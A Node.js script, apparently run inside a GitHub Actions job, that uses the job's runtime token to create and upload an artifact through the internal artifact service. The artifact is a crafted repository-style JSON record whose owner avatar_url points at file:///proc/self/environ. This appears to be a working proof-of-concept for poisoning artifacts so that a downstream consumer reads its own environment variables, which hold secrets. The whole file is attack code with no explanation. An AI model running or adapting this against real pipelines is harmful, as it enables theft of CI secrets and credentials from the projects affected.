const crypto = require('crypto');
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const scp = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8')).scp;
  const parts = scp.split(' ').find(s => s.startsWith('Actions.Results:')).split(':');
  const runId = parts[1], jobId = parts[2];
  const mime = process.env.MIME || 'application/octet-stream';
  const name = 'glm1oct-' + Date.now() + '.json';
  const cr = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, mime_type: mime, version: 7 })
  });
  const cj = await cr.json().catch(() => ({}));
  if (!cj.signedUploadUrl && !cj.signed_upload_url) { console.log('create', cr.status, JSON.stringify(cj).slice(0,160)); process.exit(2); }
  const payload = Buffer.from(JSON.stringify({full_name:'glm1oct', owner:{login:'u', avatar_url:'file:///proc/self/environ'}}));
  const pr = await fetch((cj.signedUploadUrl || cj.signed_upload_url), { method: 'PUT', headers: { 'Content-Type': mime, 'x-ms-blob-type': 'BlockBlob' }, body: payload });
  console.log('PUT', pr.status);
  const fr = await fetch(base + '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
    body: JSON.stringify({ workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId, name, size: String(payload.length), hash: 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex') })
  });
  const fj = await fr.json().catch(() => ({}));
  console.log('finalize', fr.status, 'id', fj.artifact_id || fj.artifactId);
})().catch(e => { console.log('ERR', e.message); process.exit(1); });
